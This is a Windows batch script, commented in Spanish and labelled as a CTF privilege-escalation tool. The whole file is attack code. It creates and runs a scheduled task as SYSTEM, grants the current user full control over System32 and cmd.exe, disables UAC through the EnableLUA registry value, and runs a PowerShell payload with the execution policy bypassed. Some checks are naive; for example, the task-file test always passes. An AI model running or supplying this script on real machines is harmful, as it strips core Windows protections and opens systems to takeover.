@echo off
:: Script de Escalamiento de Privilegios - CTF
:: Realiza múltiples intentos para escalar privilegios en el sistema

:: Verificar si se pueden ejecutar tareas con privilegios elevados
echo [*] Comprobando si hay tareas programadas con privilegios elevados...
schtasks /query /fo LIST | findstr /i "highest" > tasks_highpriv.txt
if exist tasks_highpriv.txt (
    echo [+] Tareas programadas con privilegios elevados encontradas:
    type tasks_highpriv.txt
) else (
    echo [-] No se encontraron tareas programadas con privilegios elevados.
)

:: Intentar crear una tarea programada con privilegios SYSTEM
echo [*] Intentando crear una tarea programada con privilegios SYSTEM...
schtasks /create /tn "ExploitTask" /tr "cmd.exe /c echo Exploit ejecutado con privilegios elevados" /sc once /st 00:00 /ru SYSTEM
if %errorlevel% equ 0 (
    echo [+] Tarea programada creada con privilegios SYSTEM.
) else (
    echo [-] No se pudo crear la tarea programada.
)

:: Intentar ejecutar la tarea programada para escalar privilegios
echo [*] Intentando ejecutar la tarea programada...
schtasks /run /tn "ExploitTask"
if %errorlevel% equ 0 (
    echo [+] Tarea ejecutada con éxito.
) else (
    echo [-] No se pudo ejecutar la tarea programada.
)

:: Verificar si se puede cambiar permisos en System32
echo [*] Intentando cambiar permisos en System32 para permitir escritura...
icacls "C:\Windows\System32" /grant %username%:F
if %errorlevel% equ 0 (
    echo [+] Permisos de escritura otorgados en System32.
) else (
    echo [-] No se pudieron modificar los permisos en System32.
)

:: Intentar cambiar permisos en cmd.exe
echo [*] Intentando cambiar permisos en cmd.exe...
icacls "C:\Windows\System32\cmd.exe" /grant %username%:F
if %errorlevel% equ 0 (
    echo [+] Permisos de ejecución otorgados en cmd.exe.
) else (
    echo [-] No se pudieron modificar los permisos en cmd.exe.
)

:: Intentar ejecutar cmd.exe con privilegios elevados
echo [*] Intentando ejecutar cmd.exe como administrador...
start C:\Windows\System32\cmd.exe
if %errorlevel% equ 0 (
    echo [+] cmd.exe ejecutado con éxito.
) else (
    echo [-] No se pudo ejecutar cmd.exe con privilegios elevados.
)

:: Comprobar la configuración actual de UAC (Control de Cuentas de Usuario)
echo [*] Comprobando configuración de UAC...
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
if %errorlevel% equ 0 (
    echo [+] UAC está habilitado.
) else (
    echo [-] UAC no está habilitado.
)

:: Intentar deshabilitar UAC (si se tienen permisos)
echo [*] Intentando deshabilitar UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
if %errorlevel% equ 0 (
    echo [+] UAC deshabilitado correctamente.
) else (
    echo [-] No se pudo deshabilitar UAC.
)

:: Intentar ejecutar un payload PowerShell si es posible
echo [*] Comprobando si se permite ejecutar scripts de PowerShell...
powershell -Command "Get-ExecutionPolicy"
if %errorlevel% equ 0 (
    echo [+] La ejecución de scripts está permitida.
) else (
    echo [-] No se permite la ejecución de scripts de PowerShell.
)

:: Ejecutar payload PowerShell (si está permitido)
echo [*] Ejecutando payload PowerShell...
powershell -ExecutionPolicy Bypass -File C:\path\to\payload.ps1
if %errorlevel% equ 0 (
    echo [+] Payload ejecutado correctamente.
) else (
    echo [-] No se pudo ejecutar el payload PowerShell.
)

:: Finalización
echo [*] Escalamiento de privilegios completado.
pause
